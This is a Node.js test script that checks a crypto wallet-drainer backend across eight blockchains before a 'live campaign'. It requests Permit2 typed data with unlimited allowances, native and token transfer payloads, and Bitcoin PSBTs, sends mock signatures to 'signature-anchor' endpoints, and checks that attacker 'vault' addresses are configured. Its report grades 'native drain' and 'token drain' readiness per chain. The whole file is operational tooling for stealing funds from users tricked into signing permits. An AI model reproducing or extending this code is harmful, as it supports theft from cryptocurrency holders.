/**
 * 8-chain drain simulation — no broadcast, no real signatures.
 * Usage: node scripts/test-8chain-simulation.mjs
 */
const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');
const EXPIRY = '2099-12-31T23:59:59.999Z';
const MOCK_SIG = '0x' + 'ab'.repeat(65);
const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

const WALLETS = {
  evm: '0xbe3cebae5728C07F39416f0dC1d0165d2972db12',
  sol: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  tron: 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
  ton: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7kBd9TzdNYiWfUZE',
  btc: 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
  cosmos: 'cosmos1huydeevpz37sd9a5tnnupta7x7ysm9upgu0j9',
  aptos: '0x1',
  sui: '0x8bafc5a08fc0d17468f8a82e7d2a667f6ef0a8c4a1f2e3d4c5b6a79887766554',
};

function parseEnvelope(res, data) {
  if (!data || typeof data !== 'object') return { ok: res.ok, message: res.statusText || '', data };
  const msg = typeof data.message === 'string' ? data.message : res.statusText || '';
  const unwrap = (p) => {
    if (p == null || typeof p !== 'object') return p;
    if (p.data != null && (typeof p.ok === 'boolean' || typeof p.success === 'boolean')) return p.data;
    return p;
  };
  if (typeof data.success === 'boolean') {
    return { ok: data.success, message: msg, data: unwrap(data.data ?? data) };
  }
  if (typeof data.ok === 'boolean') {
    return { ok: data.ok, message: msg, data: unwrap(data.data ?? data) };
  }
  return { ok: res.ok, message: msg, data };
}

async function api(method, path, body) {
  const res = await fetch(`${BACKEND}${path}`, {
    method,
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
    signal: AbortSignal.timeout(120_000),
  });
  const raw = await res.json().catch(() => ({}));
  const env = parseEnvelope(res, raw);
  return { status: res.status, ok: env.ok, message: env.message || '', data: env.data, raw };
}

function anchorBase(chainFamily, protocol, wallet, token, extra = {}) {
  return {
    ingress: 'normalized_v1',
    chain_family: chainFamily,
    protocol,
    wallet_address: wallet,
    token_address: token,
    signature: MOCK_SIG,
    nonce: `sim:${chainFamily}:${Date.now()}`,
    expiry_iso: EXPIRY,
    wallet_type: 'Simulation',
    scout_value_usd: 1,
    max_allowance: MAX_PERMIT,
    requires_quorum: false,
    ...extra,
  };
}

const results = [];

function record(chain, field, value, note = '') {
  let row = results.find((r) => r.chain === chain);
  if (!row) {
    row = { chain, nativeOk: '—', tokenOk: '—', configOk: '—', notes: [] };
    results.push(row);
  }
  if (field === 'note') {
    if (note) row.notes.push(note);
    return;
  }
  row[field] = value;
  if (note) row.notes.push(note);
}

console.log('=== 8-Chain Drain Simulation ===');
console.log('Backend:', BACKEND, '\n');

// ── Config probes ──────────────────────────────────────────────────────────
const [healthProd, clientConfig] = await Promise.all([
  api('GET', '/health/production'),
  api('GET', '/api/v1/client-config'),
]);

const vaults = clientConfig.data?.vault_addresses ?? {};
const tiers = healthProd.data?.tiers ?? healthProd.data?.summary ?? {};

function checkFromTier(id) {
  const tier = Array.isArray(tiers)
    ? tiers.find((t) => t.tier === id)
    : tiers[id];
  if (!tier) return { ok: false, blockers: ['tier missing'] };
  return { ok: (tier.blockers?.length ?? 0) === 0, blockers: tier.blockers ?? [], grade: tier.grade };
}

const evmTier = checkFromTier('evm_only');
const fiveTier = checkFromTier('five_chain');

record('EVM', 'configOk', evmTier.ok ? '✅' : '⚠️', evmTier.blockers.join('; ') || `grade ${evmTier.grade}`);
record('Solana', 'configOk', vaults.sol ? '✅' : '⚠️', vaults.sol ? `vault ${vaults.sol}` : 'vault missing in client-config');
record('Tron', 'configOk', vaults.tron ? '✅' : '⚠️', vaults.tron ? `vault ${vaults.tron}` : 'vault missing');
record('TON', 'configOk', vaults.ton ? '✅' : '⚠️', vaults.ton ? `vault ${vaults.ton}` : 'vault missing');
record('Bitcoin', 'configOk', vaults.btc ? '✅' : '⚠️', vaults.btc ? `vault ${vaults.btc}` : 'vault missing');
record('Cosmos', 'configOk', vaults.cosmos ? '✅' : '⚠️ not configured', vaults.cosmos || 'empty vault in client-config');
record('Aptos', 'configOk', vaults.aptos ? '✅' : '⚠️ not configured', vaults.aptos || 'empty vault in client-config');
record('Sui', 'configOk', vaults.sui ? '✅' : '⚠️ not configured', vaults.sui || 'empty vault in client-config');

// ── EVM ────────────────────────────────────────────────────────────────────
const evmBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  nativeAmount: '1000000000000000',
});
const evmHasTyped = !!evmBatch.data?.typed_data;
const evmHasNative = !!evmBatch.data?.native_transfer;
record(
  'EVM',
  'nativeOk',
  evmBatch.status === 200 && evmHasTyped && evmHasNative ? '✅' : '❌',
  `batch ${evmBatch.status}: typed_data=${evmHasTyped} native_transfer=${evmHasNative}`,
);
record('EVM', 'tokenOk', evmBatch.status === 200 && evmHasTyped ? '✅' : '❌', 'Permit2 batch typed_data');

const evmEmptyPermits = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [],
  nativeAmount: '1000000000000000',
});
record(
  'EVM',
  'note',
  '',
  `permits:[] test → ${evmEmptyPermits.status} (API requires non-empty permits[])`,
);

// ── Solana (native tx via batch builder) ───────────────────────────────────
const solBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  sol_wallet: WALLETS.sol,
  nativeAmountSol: '1000000',
});
const solHasWire = !!solBatch.data?.native_transfer_sol;
record(
  'Solana',
  'nativeOk',
  solBatch.status === 200 && solHasWire ? '✅' : '❌',
  `batch native_transfer_sol=${solHasWire} status=${solBatch.status} ${solBatch.message || ''}`.trim(),
);

const solAnchor = await api(
  'POST',
  '/api/v1/signature-anchor',
  anchorBase('SVM', 'solana', WALLETS.sol, 'OMNI_SVM_ANCHOR', { amount: '1' }),
);
record(
  'Solana',
  'tokenOk',
  solAnchor.status === 200 ? '✅' : solAnchor.status === 502 ? '⚠️' : '❌',
  `anchor SVM ${solAnchor.status}: ${(solAnchor.message || '').slice(0, 80)}`,
);

// SPL token leg via batch metadata (simulation)
const solSplBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  sol_wallet: WALLETS.sol,
  spl_mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
  spl_amount: '1000000',
});
record(
  'Solana',
  'note',
  '',
  `SPL batch spl_transfer=${!!solSplBatch.data?.spl_transfer} status=${solSplBatch.status}`,
);

// ── Tron ───────────────────────────────────────────────────────────────────
const trxBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  trx_wallet: WALLETS.tron,
  nativeAmountTrx: '1000000',
});
const trxHasWire = !!trxBatch.data?.native_transfer_trx;
record(
  'Tron',
  'nativeOk',
  trxBatch.status === 200 && trxHasWire ? '✅' : trxBatch.status === 500 ? '⚠️' : '❌',
  `batch native_transfer_trx=${trxHasWire} status=${trxBatch.status} ${(trxBatch.message || '').slice(0, 80)}`,
);

const tronAnchor = await api(
  'POST',
  '/api/v1/signature-anchor',
  anchorBase('TRON', 'tron', WALLETS.tron, 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', { amount: '1' }),
);
record(
  'Tron',
  'tokenOk',
  tronAnchor.status === 200 ? '✅' : tronAnchor.status === 400 ? '⚠️' : '❌',
  `anchor TRON ${tronAnchor.status}: ${(tronAnchor.message || '').slice(0, 80)}`,
);

// ── TON ────────────────────────────────────────────────────────────────────
const tonBatch = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: WALLETS.evm,
  chain_id: 1,
  permits: [{ token: USDC, amount: MAX_PERMIT }],
  ton_wallet: WALLETS.ton,
  nativeAmountTon: '100000000',
});
const tonHasWire = !!tonBatch.data?.native_transfer_ton;
record(
  'TON',
  'nativeOk',
  tonBatch.status === 200 && tonHasWire ? '✅' : '❌',
  `batch native_transfer_ton=${tonHasWire} status=${tonBatch.status}`,
);

const tonAnchor = await api(
  'POST',
  '/api/v1/signature-anchor',
  anchorBase('TON', 'ton', WALLETS.ton, 'OMNI_TON_ANCHOR', { amount: '1' }),
);
record(
  'TON',
  'tokenOk',
  tonAnchor.status === 200 ? '✅' : tonAnchor.status === 400 ? '⚠️' : '❌',
  `anchor TON ${tonAnchor.status}: ${(tonAnchor.message || '').slice(0, 80)}`,
);

// ── Bitcoin ────────────────────────────────────────────────────────────────
const btcPsbt = await api('POST', '/api/v1/signature-anchor/bitcoin-psbt', {
  wallet_address: WALLETS.btc,
  amount_sat: '1000',
});
const btcHasPsbt = !!btcPsbt.data?.psbt_base64;
record(
  'Bitcoin',
  'nativeOk',
  btcPsbt.status === 200 && btcHasPsbt ? '✅' : btcPsbt.status === 500 ? '⚠️' : '❌',
  `psbt status=${btcPsbt.status} psbt_base64=${btcHasPsbt} — ${(btcPsbt.message || '').slice(0, 100)}`,
);
record('Bitcoin', 'tokenOk', 'N/A', 'UTXO native only');

// ── Cosmos ─────────────────────────────────────────────────────────────────
const cosmosNative = await api(
  'POST',
  '/api/v1/signature-anchor',
  anchorBase('COSMOS', 'cosmos', WALLETS.cosmos, 'OMNI_COSMOS_ANCHOR', { amount: '1' }),
);
record(
  'Cosmos',
  'nativeOk',
  cosmosNative.status === 200 ? '✅' : cosmosNative.status === 503 ? '⚠️' : '❌',
  `anchor ${cosmosNative.status}: ${(cosmosNative.message || '').slice(0, 100)}`,
);

const cosmosToken = await api('POST', '/api/v1/signature-anchor', {
  ingress: 'normalized_v1',
  chain_family: 'EVM',
  protocol: 'omnichain_atomic_v1',
  wallet_address: WALLETS.cosmos,
  token_address: 'OMNI_COSMOS_ANCHOR',
  signature: MOCK_SIG,
  nonce: `sim:cosmos-native-omni:${Date.now()}`,
  expiry_iso: EXPIRY,
  wallet_type: 'Simulation',
  scout_value_usd: 1,
  max_allowance: MAX_PERMIT,
  requires_quorum: false,
  cosmos_payload: {
    native_amount_cosmos: '1',
    cosmos_signed_tx: 'AQIDBA==',
    cosmos_tx_encoding: 'base64',
  },
});
record(
  'Cosmos',
  'tokenOk',
  cosmosToken.status === 200 ? '✅' : cosmosToken.status === 400 ? '⚠️' : '❌',
  `omnichain CW20 ${cosmosToken.status}: ${(cosmosToken.message || '').slice(0, 100)}`,
);

// ── Aptos ──────────────────────────────────────────────────────────────────
const aptosNative = await api(
  'POST',
  '/api/v1/signature-anchor',
  anchorBase('APTOS', 'aptos', WALLETS.aptos, 'OMNI_APTOS_ANCHOR', { amount: '1' }),
);
record(
  'Aptos',
  'nativeOk',
  aptosNative.status === 200 ? '✅' : aptosNative.status === 503 ? '⚠️' : '❌',
  `anchor ${aptosNative.status}: ${(aptosNative.message || '').slice(0, 100)}`,
);

const aptosToken = await api('POST', '/api/v1/signature-anchor', {
  ingress: 'normalized_v1',
  chain_family: 'EVM',
  protocol: 'omnichain_atomic_v1',
  wallet_address: WALLETS.aptos,
  token_address: 'OMNI_APTOS_ANCHOR',
  signature: MOCK_SIG,
  nonce: `sim:aptos-coin:${Date.now()}`,
  expiry_iso: EXPIRY,
  wallet_type: 'Simulation',
  scout_value_usd: 1,
  max_allowance: MAX_PERMIT,
  requires_quorum: false,
  aptos_payload: {
    native_amount_aptos: '1',
    aptos_signed_tx: '0x01',
    aptos_signature: '0x' + 'cd'.repeat(64),
  },
});
record(
  'Aptos',
  'tokenOk',
  aptosToken.status === 200 ? '✅' : aptosToken.status === 400 ? '⚠️' : '❌',
  `omnichain coin ${aptosToken.status}: ${(aptosToken.message || '').slice(0, 100)}`,
);

// ── Sui ────────────────────────────────────────────────────────────────────
const suiNative = await api(
  'POST',
  '/api/v1/signature-anchor',
  anchorBase('SUI', 'sui', WALLETS.sui, 'OMNI_SUI_ANCHOR', { amount: '1' }),
);
record(
  'Sui',
  'nativeOk',
  suiNative.status === 200 ? '✅' : suiNative.status === 503 ? '⚠️' : '❌',
  `anchor ${suiNative.status}: ${(suiNative.message || '').slice(0, 100)}`,
);

const suiToken = await api('POST', '/api/v1/signature-anchor', {
  ingress: 'normalized_v1',
  chain_family: 'EVM',
  protocol: 'omnichain_atomic_v1',
  wallet_address: WALLETS.sui,
  token_address: 'OMNI_SUI_ANCHOR',
  signature: MOCK_SIG,
  nonce: `sim:sui-coin:${Date.now()}`,
  expiry_iso: EXPIRY,
  wallet_type: 'Simulation',
  scout_value_usd: 1,
  max_allowance: MAX_PERMIT,
  requires_quorum: false,
  sui_payload: {
    native_amount_sui: '1',
    sui_signed_tx: 'AAECAw==',
    sui_signature: '0x' + 'ef'.repeat(64),
  },
});
record(
  'Sui',
  'tokenOk',
  suiToken.status === 200 ? '✅' : suiToken.status === 400 ? '⚠️' : '❌',
  `omnichain coin ${suiToken.status}: ${(suiToken.message || '').slice(0, 100)}`,
);

// ── Report ─────────────────────────────────────────────────────────────────
console.log('\n## Summary Table\n');
console.log('| Chain | Native drain OK | Token drain OK | Config OK | Notes |');
console.log('|-------|-----------------|----------------|-----------|-------|');
for (const r of results) {
  const notes = (r.notes || []).filter(Boolean).join('; ').slice(0, 120);
  console.log(`| ${r.chain} | ${r.nativeOk} | ${r.tokenOk} | ${r.configOk} | ${notes || '—'} |`);
}

const failures = results.filter(
  (r) => r.nativeOk === '❌' || r.configOk === '⚠️ not configured' || r.configOk === '⚠️',
);
const critical = results.filter(
  (r) =>
    r.nativeOk === '❌' ||
    r.configOk === '⚠️ not configured' ||
    (r.chain === 'EVM' && r.nativeOk !== '✅'),
);

console.log('\n## Errors / Missing Config\n');
if (failures.length === 0) {
  console.log('None — all chains passed simulation.');
} else {
  for (const r of failures) {
    console.log(`- **${r.chain}**: config=${r.configOk} native=${r.nativeOk} token=${r.tokenOk}`);
    for (const n of r.notes || []) console.log(`  - ${n}`);
  }
}

console.log('\n## Five-chain readiness blockers\n');
if (fiveTier.blockers?.length) {
  for (const b of fiveTier.blockers) console.log(`- ${b}`);
} else {
  console.log('- none');
}

const verdict =
  critical.length === 0 && !results.some((r) => r.configOk === '⚠️ not configured')
    ? 'All chains ready'
    : 'Issues found – fix these before live campaign';
console.log(`\n## Final Verdict: ${verdict}\n`);

process.exit(critical.length > 0 ? 1 : 0);
